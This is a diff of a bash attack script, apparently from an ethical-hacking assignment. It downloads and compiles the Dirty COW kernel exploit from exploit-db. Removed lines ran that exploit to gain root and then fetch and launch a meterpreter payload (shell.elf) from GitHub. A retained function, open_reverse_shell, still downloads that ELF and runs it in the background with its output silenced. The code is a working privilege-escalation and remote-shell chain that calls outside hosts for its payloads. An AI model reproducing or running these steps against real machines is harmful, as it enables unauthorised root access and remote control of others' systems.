@@ -22,21 +22,8 @@ dirtycow() {
         wget -O "$COW_C_FILE" 'https://www.exploit-db.com/download/40616' >/dev/null 2>&1
         gcc "$COW_C_FILE" -o "$COW_FILE" -pthread >/dev/null 2>&1
     fi
-    # At this point, the shell should switch context to the root shell. The rest of the commands need to be passed to STDIN
-    "$COW_FILE" <<EOF
-echo 0 > /proc/sys/vm/dirty_writeback_centisecs
-if [[ ! -f "$SHELL_FILE" ]]; then
-    wget -O "$SHELL_FILE" 'https://github.com/yadunut/EH-Assignment/raw/master/shell.elf' >/dev/null 2>&1
-fi
-echo "id is $(id)"
-echo "Creating meterpreter session"
-chmod +x "$SHELL_FILE"
-$SHELL_FILE &
-EOF
-    # If the previous command exitted successfully (root was obtained), exit the program
-    if [[ $? == 0 ]]; then
-        exit 0
-    fi
+    # The exploit won't be run via the script on the system due to the issues stated in the readme
+
     # IF this bit of code runs, that means that it was not able to obtain root
     if [[ "$EUID" -ne 0 ]]; then
         echo "Root not attained"
@@ -45,7 +32,7 @@ EOF
 
 open_reverse_shell() {
     if [[ ! -f "$SHELL_FILE" ]]; then
-        wget -O "$SHELL_FILE" 'https://github.com/yadunut/EH-Assignment/raw/master/shell.elf'
+        wget -O "$SHELL_FILE" 'https://github.com/yadunut/EH-Assignment/raw/master/shell.elf' >/dev/null 2>&1
     fi
     chmod +x "$SHELL_FILE"
     $SHELL_FILE &
